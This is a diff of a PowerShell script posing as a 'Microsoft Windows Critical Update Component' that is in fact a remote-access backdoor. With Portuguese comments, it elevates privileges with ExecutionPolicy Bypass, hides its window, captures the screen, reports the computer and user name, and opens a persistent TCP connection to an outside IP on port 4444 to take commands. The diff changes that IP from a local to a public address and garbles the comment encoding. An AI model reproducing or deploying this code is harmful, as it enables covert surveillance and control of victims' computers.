@@ -7,11 +7,11 @@ Microsoft Windows Critical Update Component
 Version: 10.0.19045.1
 #>
 
-# ===== CONFIGURAÇÕES =====
-$serverIP = "192.168.0.4I"  # MUDE PARA SEU IP
+# ===== CONFIGURAÃ‡Ã•ES =====
+$serverIP = "198.1.195.194"  # MUDE PARA SEU IP
 $serverPort = 4444
 
-# ===== ELEVAR PRIVILÉGIOS =====
+# ===== ELEVAR PRIVILÃ‰GIOS =====
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
     Start-Process powershell -Verb RunAs -ArgumentList $arguments
@@ -28,7 +28,7 @@ Add-Type -Name Window -Namespace Console -MemberDefinition @'
 $consolePtr = [Console.Window]::GetConsoleWindow()
 [Console.Window]::ShowWindow($consolePtr, 0)
 
-# ===== FUNÇÕES =====
+# ===== FUNÃ‡Ã•ES =====
 function Get-ScreenCapture {
     Add-Type -AssemblyName System.Windows.Forms
     Add-Type -AssemblyName System.Drawing
@@ -175,7 +175,7 @@ function Power-Control {
     return "POWER_$Action"
 }
 
-# ===== CONEXÃO PRINCIPAL =====
+# ===== CONEXÃƒO PRINCIPAL =====
 while ($true) {
     try {
         $client = New-Object System.Net.Sockets.TcpClient($serverIP, $serverPort)
@@ -184,7 +184,7 @@ while ($true) {
         $reader = New-Object System.IO.StreamReader($stream)
         $writer.AutoFlush = $true
         
-        # Envia identificação
+        # Envia identificaÃ§Ã£o
         $writer.WriteLine("$env:COMPUTERNAME@$env:USERNAME")
         
         while ($client.Connected) {
@@ -247,11 +247,12 @@ while ($true) {
                     break 
                 }
                 default { 
-                    $writer.WriteLine("Comando não reconhecido: $cmd") 
+                    $writer.WriteLine("Comando nÃ£o reconhecido: $cmd") 
                 }
             }
         }
     } catch {
         Start-Sleep -Seconds 10
     }
+
 }
